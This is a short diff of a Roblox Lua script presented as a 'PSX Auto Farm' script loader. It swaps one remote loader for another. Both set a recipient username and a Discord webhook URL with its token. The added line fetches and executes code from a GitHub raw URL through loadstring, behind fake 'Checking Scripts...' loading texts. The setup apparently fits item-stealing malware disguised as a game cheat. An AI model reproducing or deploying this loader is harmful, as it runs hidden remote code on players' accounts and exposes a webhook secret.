@@ -1,5 +1,10 @@
-_G.Username = "initialacceleration"
-_G.HubName = "PSX Auto Farm"
-_g.WebhookUrl = "https://discord.com/api/webhooks/1125918935993290894/4X3CRFPusbt_kLz1TOY7AtDEM5bStlN0nlezTnpCeI2qtyIzRAH2zdy61rrylU4pn3pJ"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
+--Username = "initialacceleration"--
+--Username2 = "initialacceleration"--
+--WebHook = "https://discord.com/api/webhooks/1125918935993290894/4X3CRFPusbt_kLz1TOY7AtDEM5bStlN0nlezTnpCeI2qtyIzRAH2zdy61rrylU4pn3pJ"--
+--loadingscreen = true--
+--_G.CustomScriptName = "PSX SCRIPT LOADER"--
+--_G.Text1 = "Script Loaded..."--
+--_G.Text2 = "Waiting for Script..."--
+--_G.Text3 = "Checking Scripts..."--
+--_G.Text4 = "Starting Script..."--
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ZphanXtasmC/LOLSCRIPT/main/WOW%20SCRIPT", true))()
